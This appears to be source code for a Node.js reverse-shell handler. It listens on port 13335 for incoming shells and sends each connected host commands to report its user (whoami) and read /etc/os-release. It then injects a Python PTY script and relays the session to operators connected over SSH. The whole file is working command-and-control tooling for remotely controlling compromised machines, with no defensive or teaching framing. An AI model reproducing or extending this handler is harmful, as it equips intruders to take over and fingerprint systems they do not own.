import './ssh';

import * as net from 'net';
import fs from 'fs';
import path from 'path';
import { activeConnections, activeSSHConnections, ConnectionInfo } from './state';

const PORT = 13335;

const reverseShellServer = net.createServer();
const script = fs.readFileSync(path.join(__dirname, 'client.py'), 'utf-8');

reverseShellServer.on('connection', (socket) => {
    const connectionId = `${socket.remoteAddress}:${socket.remotePort}`;
    console.log(`[+] New reverse shell connection from ${connectionId}`);
    const info: ConnectionInfo = { socket, user: '', os: '' };
    activeConnections.set(connectionId, info);

    // 发送创建PTY的命令，设置初始终端大小
    const ptyCommand = `python3 -c "${script.replace(/\\/g, '\\').replace(/"/g, '\\"')}" ; echo SHELL_EXITED`;
    info.socket.write('echo ---START_INFO$[1+1]---\necho WHOAMI=$(whoami)\ncat /etc/os-release\necho ---END_INFO$[1+1]---\n');
    info.socket.write(ptyCommand);

    let isInfo = false;
    let buffer = '';
    const infoCallback = (data) => {
        const str = data.toString();
        if (str.includes('---END_INFO2---') && isInfo) {
            buffer += str.split('---END_INFO2---')[0];
            const lines = buffer.split(/[\r\n]/);
            for (const line of lines) {
                if (line.startsWith('PRETTY_NAME=')) {
                    info.os = line.slice('PRETTY_NAME='.length).replace(/"/g, '').trim();
                } else if (line.startsWith('WHOAMI=')) {
                    info.user = line.slice('WHOAMI='.length).trim();
                }
            }
            info.socket.off('data', infoCallback);
            activeSSHConnections.forEach((sshState, cl) => {
                sshState.drawBottomBar();
            });
        }
        if (str.includes('---START_INFO2---')) {
            buffer += str.split('---START_INFO2---')[1];
            isInfo = true;
        } else if (isInfo) {
            buffer += str;
        }
    }
    info.socket.on('data', infoCallback);

    info.socket.on('data', (data) => {
        const str = data.toString();
        if (str.includes('SHELL_EXITED')) {
            activeSSHConnections.forEach((sshConn, client) => {
                if (sshConn.selectedId === connectionId) client.end();
            });
            info.socket.write(ptyCommand);
            return;
        }
        console.log(`[${connectionId}] ${str.trim()}`);
        activeSSHConnections.forEach((sshConn) => {
            if (sshConn.selectedId === connectionId && sshConn.stream) {
                sshConn.stream.write(data);
                if (data.toString().includes('\x1b[2J')) {
                    sshConn.drawBottomBar();
                }
            }
        });
    });

    info.socket.on('close', () => {
        console.log(`[-] Reverse shell connection closed from ${connectionId}`);
        activeConnections.delete(connectionId);
        activeSSHConnections.forEach((sshState, client) => {
            if (sshState.selectedId === connectionId) {
                sshState.selectedId = null;
                sshState.commandMode = true;
                sshState.stream?.write('\r\nReverse shell connection closed.\r\nEntering command mode.\r\n');
                sshState.drawBottomBar();
            }
        });
    });

    info.socket.on('error', (err) => {
        console.error(`[!] Socket error: ${err.message}`);
        activeConnections.delete(connectionId);
    });
});

reverseShellServer.listen(PORT, () => {
    console.log(`[*] Reverse shell server listening on port ${PORT}`);
    console.log('[*] Waiting for reverse shell connections...');
});

// 生成SSH密钥对（如果不存在）
